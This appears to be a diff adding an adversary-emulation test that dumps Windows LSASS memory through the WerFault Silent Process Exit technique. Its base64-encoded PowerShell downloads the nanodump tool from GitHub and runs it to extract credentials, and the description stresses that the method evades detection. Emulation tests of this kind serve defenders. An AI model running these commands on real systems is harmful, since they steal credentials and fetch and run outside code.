@@ -1,0 +1,18 @@
+- id: 148fecc2-93eb-57bd-b21f-afd1c343b26f
+  name: Soumaia ART Tests - Dump LSASS.exe Memory through Silent Process Exit
+  description: "WerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a \nmemory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism \nintroduced in Windows 7 called Silent Process Exit, which provides the ability to trigger\nspecific actions for a monitored process in one of two scenarios; either the process terminates\nitself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. \nThe major advantage of this technique is that it does not cause lsass.exe to crash, and since \nWerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides \nthe added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, \nfrom an attacker standpoint this is appealing as their illicit credential extraction will \nappear benign because from a defender’s viewpoint it’s within the realm of normal activity.\n\nUpon successful execution, you should find the dump file in directory of your choice or \"%temp%\\SilentProcessExit\" by default. (requires elevation)"
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAbgBhAG4AbwBkAHUAbQBwAC4AeAA2ADQALgBlAHgAZQApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgAKAE4AZQB3AC0ASQB0AGUAbQAgAC0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABJAGcAbgBvAHIAZQAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBmAG8AcgB0AHIAYQAvAG4AYQBuAG8AZAB1AG0AcAAvAHIAYQB3AC8AMgBjADAAYgAzAGQANQBkADUAOQBjADUANgA3ADEANAAzADEAMgAxADMAMQBkAGUAOQA2ADYANQBkAGUAZgBiADkAOAA1ADUAMQBjADIANwAvAGQAaQBzAHQALwBuAGEAbgBvAGQAdQBtAHAALgB4ADYANAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAbgBhAG4AbwBkAHUAbQBwAC4AeAA2ADQALgBlAHgAZQAiAAoA
+          )
+          %TEMP%\ART-ExternalPayloads\nanodump.x64.exe --silent-process-exit "%temp%\SilentProcessExit"
+        cleanup: |-
+          rmdir "%temp%\SilentProcessExit" /s /q >nul 2> nul
